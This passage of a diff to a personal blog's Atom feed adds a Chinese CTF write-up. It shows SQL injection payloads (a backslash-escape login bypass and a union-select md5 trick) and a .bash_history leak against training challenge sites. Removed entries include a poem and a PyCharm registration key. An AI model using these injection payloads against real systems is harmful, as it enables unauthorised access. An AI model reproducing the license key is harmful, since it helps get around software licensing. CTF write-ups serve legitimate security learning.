@clean((string)$_GET[&apos;password&apos;]);</div><div class="line"></div><div class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</div><div class="line">$result=mysql_query($query);</div><div class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</div><div class="line">	die(&apos;Invalid password!&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $flag;</div><div class="line">--&gt;</div></pre></td></tr></table></figure>
+<p>重点在于：</p>
+<p>在这里由于’被转编码，所以可以使用\转义</p>
+<p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p>
+<p>构造：<code>http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23</code></p>
+<p>插入后大致的sql语句为：<code>SELECT * FROM users WHERE name=’ admin\’ AND pass=’ or 1#’;</code></p>
+<h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h4><p>zh个很有意思，首先是一个jsfuck，不用解码，直接执行就可以</p>
+<p>执行后得到：1bc29b36f623ba82aaf6724fd3b16718.php</p>
+<p>打开发现不是这回事</p>
+<p>又看提示，想到bash的一些相关，再看这个网页的header发现tip “history of bash”</p>
+<p>bash_history是用来存放历史记录的，所以我们就访问</p>
+<p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p>
+<p>又得到提示：zip -r flagbak.zip ./*</p>
+<p>那么就访问这个：</p>
+<p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p>
+<p>下载解压得到flag is:nctf{bash_history_means_what}</p>
+<h4 id="有源码"><a href="#有源码" class="headerlink" title="有源码"></a>有源码</h4><p>给了题目的源码，可以自己搭建环境来尝试</p>
+<p><a href="https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB" target="_blank" rel="external">https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB</a></p>
+<h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>审计！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</div><div class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  else &#123;</div><div class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>strcasecmp是不分大小比较，这样只要得到密码md5值相同即可，提示已经说了用union所以我们来构造payload：</p>
+<p>username填写’ union select md5(1)#</p>
+<p>password填写1</p>
+<p>得flag：ntcf{union_select_is_wtf}</p>
+<p>剩余的题目不建议小白来做，想做的看这个链接</p>
+<p><a href="http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9</a></p>
+<p>或者：</p>
+<p><a href="https://www.40huo.cn/blog/nctf-writeup.html" target="_blank" rel="external">https://www.40huo.cn/blog/nctf-writeup.html</a></p>
+<p>（ps：东西太多写不动了。。。）</p>
+<p>总结：可以写点base64、base32、url编码解码、文本与16进制转换的小工具。&lt;&lt;&lt;可以练手，但是hackbar带全了和burp</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h4&gt;&lt;p&gt;nctf{flag_admiaanaaaaaaaaaaa}&lt;/p&gt;
+&lt;h4 id=&quot;php的弱类型加MD5碰撞&quot;&gt;&lt;a hr
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>常见Web源码泄露总结</title>
@@ -161,26 +333,6 @@
     
       &lt;p&gt;范围：0-65535&lt;br&gt;固定端口：0-1023 1024保留&lt;br&gt;动态端口：1024-65535&lt;/p&gt;
 &lt;h4 id=&quot;常用端口&quot;&gt;&lt;a href=&quot;#常用端口&quot; class=&quot;headerlink&quot; title=&quot;常用端口&quot;&gt;&lt;/a&gt;常用端口&lt;/h4&gt;&lt;p&gt;21：
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>TO HER</title>
-    <link href="http://zer0yu.github.io/2017/01/23/TO-HER/"/>
-    <id>http://zer0yu.github.io/2017/01/23/TO-HER/</id>
-    <published>2017-01-23T10:04:15.000Z</published>
-    <updated>2017-01-23T10:21:55.000Z</updated>
-    
-    <content type="html"><![CDATA[<center>질량의 크기는 부피와 비례하지 않는다.<br><br>重量和大小不成比例<br><br>제비꽃 같은 조그만한 그 계집애가<br><br>像紫罗兰一般幼小的那丫头<br><br>꽃잎같이 하늘거리는 그계집애가<br><br>像花瓣一般轻曳的那丫头<br><br>지구보다 더 큰 질량으로 나를 끌어당긴다.<br><br>以超过地球的重量吸引着我<br><br>순간<br><br>瞬间，我<br><br>나는 뉴턴의 사과 처럼<br><br>就如同牛顿的苹果一样<br><br>사정없이 그녀에게로 굴러 떨어졌다.<br><br>不受控制的向她掉落滚去<br><br>쿵 소리를 내며 쿵쿵 소리를 내며<br><br>咚的一声 咚咚作响<br><br>심장이 하늘에서 땅까지<br><br>心脏  自天上到地下<br><br>아찔한 진자운동을 계속하였다.<br><br>持续着令人眩晕的摇摆运动<br><br>사랑이었다.<br><br>原来这就是是初恋啊</center>
-
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=447778944&auto=1&height=66"></iframe>]]></content>
-    
-    <summary type="html">
-    
-      &lt;center&gt;질량의 크기는 부피와 비례하지 않는다.&lt;br&gt;&lt;br&gt;重量和大小不成比例&lt;br&gt;&lt;br&gt;제비꽃 같은 조그만한 그 계집애가&lt;br&gt;&lt;br&gt;像紫罗兰一般幼小的那丫头&lt;br&gt;&lt;br&gt;꽃잎같이 하늘거리는 그계집애가&lt;br&gt;&lt;br&gt;像花瓣一般轻曳的那丫头&lt;br&gt;&lt;
     
     </summary>
     
@@ -350,28 +502,6 @@
 &lt;p&gt;输入 netsh winsock reset&lt;/p&gt;
 &lt;p&gt;重启就好了。。&lt;/p&gt;
 
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>figlet--一款很好用的生成字符画的工具</title>
-    <link href="http://zer0yu.github.io/2017/01/22/figlet-%E4%B8%80%E6%AC%BE%E5%BE%88%E5%A5%BD%E7%94%A8%E7%9A%84%E7%94%9F%E6%88%90%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
-    <id>http://zer0yu.github.io/2017/01/22/figlet-一款很好用的生成字符画的工具/</id>
-    <published>2017-01-22T03:05:35.000Z</published>
-    <updated>2017-01-22T03:07:08.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>安装：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install figlet</div></pre></td></tr></table></figure>
-<p><img src="http://ok44mzy2k.bkt.clouddn.com/flight.png" alt="1"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;安装：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div
     
     </summary>
     
@@ -626,25 +756,6 @@
   </entry>
   
   <entry>
-    <title>PyCharm2016.2专业版注册码</title>
-    <link href="http://zer0yu.github.io/2017/01/22/PyCharm2016-2%E4%B8%93%E4%B8%9A%E7%89%88%E6%B3%A8%E5%86%8C%E7%A0%81/"/>
-    <id>http://zer0yu.github.io/2017/01/22/PyCharm2016-2专业版注册码/</id>
-    <published>2017-01-22T02:48:28.000Z</published>
-    <updated>2017-01-22T02:48:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">43B4A73YYJ-eyJsaWNlbnNlSWQiOiI0M0I0QTczWVlKIiwibGljZW5zZWVOYW1lIjoibGFuIHl1IiwiYXNza</div><div class="line">WduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVj</div><div class="line">YXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb</div><div class="line">2RlIjoiSUkiLCJwYWlkVXBUbyI6IjIwMTctMDItMjUifSx7ImNvZGUiOiJBQyIsInBhaWRVcFRvIjoiMjAxNy0</div><div class="line">wMi0yNSJ9LHsiY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IlBTIiwicGFp</div><div class="line">ZFVwVG8iOiIyMDE3LTAyLTI1In0seyJjb2RlIjoiRE0iLCJwYWlkVXBUbyI6IjIwMTctMDItMjUifSx7ImNvZG</div><div class="line">UiOiJDTCIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjAxNy0</div><div class="line">wMi0yNSJ9LHsiY29kZSI6IlJDIiwicGFpZFVwVG8iOiIyMDE3LTAyLTI1In0seyJjb2RlIjoiUEMiLCJwYWlkV</div><div class="line">XBUbyI6IjIwMTctMDItMjUifSx7ImNvZGUiOiJSTSIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9LHsiY29kZ</div><div class="line">SI6IldTIiwicGFpZFVwVG8iOiIyMDE3LTAyLTI1In0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwMTctMDItM</div><div class="line">jUifSx7ImNvZGUiOiJEQyIsInBhaWRVcFRvIjoiMjAxNy0wMi0yNSJ9XSwiaGFzaCI6IjMzOTgyOTkvMCIsI</div><div class="line">mdyYWNlUGVyaW9kRGF5cyI6MCwiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9u</div><div class="line">Z2F0ZWQiOmZhbHNlfQ==-keaxIkRgXPKE4BR/ZTs7s7UkP92LBxRe57HvWamu1EHVXTcV1B4f/KN</div><div class="line">QIrpOpN6dgpjig5eMVMPmo7yMPl+bmwQ8pTZaCGFuLqCHD1ngo6ywHKIQy0nR249sAUVaCl2wGJ</div><div class="line">waO4JeOh1opUx8chzSBVRZBMz0/MGyygi7duYAff9JQqfH3p/BhDTNM8eKl6z5tnneZ8ZG5bG1XvqF</div><div class="line">TqWk4FhGsEWdK7B+He44hPjBxKQl2gmZAodb6g9YxfTHhVRKQY5hQ7KPXNvh3ikerHkoaL5apgsV</div><div class="line">BZJOTDE2KdYTnGLmqxghFx6L0ofqKI6hMr48ergMyflDk6wLNGWJvYHLWw==-MIIEPjCCAiagAwIBA</div><div class="line">gIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwM</div><div class="line">jA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0B</div><div class="line">AQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbL</div><div class="line">LuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N</div><div class="line">+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0</div><div class="line">rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUY</div><div class="line">SvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQ</div><div class="line">CMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Q</div><div class="line">b1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYD</div><div class="line">VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYg</div><div class="line">QedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+H</div><div class="line">xAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9b</div><div class="line">VzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4z</div><div class="line">wfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxE</div><div class="line">dek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0</div><div class="line">l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h</div><div class="line">7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38Ak</div><div class="line">nZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lR</div><div class="line">JnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/di
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>Linux下使用锐捷的方法</title>
     <link href="http://zer0yu.github.io/2017/01/22/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
     <id>http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/</id>
@@ -683,29 +794,6 @@
     
       &lt;p&gt;Weblogic_SSRF的一个利用脚本&lt;/p&gt;
 &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>RSS阅读器</title>
-    <link href="http://zer0yu.github.io/2017/01/22/RSS%E9%98%85%E8%AF%BB%E5%99%A8/"/>
-    <id>http://zer0yu.github.io/2017/01/22/RSS阅读器/</id>
-    <published>2017-01-22T02:42:34.000Z</published>
-    <updated>2017-01-22T02:43:24.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>推荐两个个RSS阅读器，免费的。用了好久，很不错。</p>
-<p>1.<a href="http://azreader.net/" target="_blank" rel="external">http://azreader.net/</a></p>
-<p>2.深蓝阅读</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;推荐两个个RSS阅读器，免费的。用了好久，很不错。&lt;/p&gt;
-&lt;p&gt;1.&lt;a href=&quot;http://azreader.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://azreader.net/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;2.深蓝阅读&lt;/
     
     </summary>
     
